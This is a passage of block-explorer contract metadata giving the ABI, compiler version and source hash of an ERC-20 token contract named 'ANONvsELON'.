"[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"allowAddress\",\"type\":\"address\"}],\"name\":\"addAllowance\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeBotPercent\",\"type\":\"uint256\"}],\"name\":\"setFeeBot\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwnerAddress\",\"type\":\"address\"}],\"name\":\"transferOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"updateFeeTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ANONvsELON", "CompilerVersion": "v0.6.12+commit.27d51765", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://0b8cf042ae1bef32a20d2bd0c7e7af8c91213e32c6e68ca060fb3863d92dd244"}]}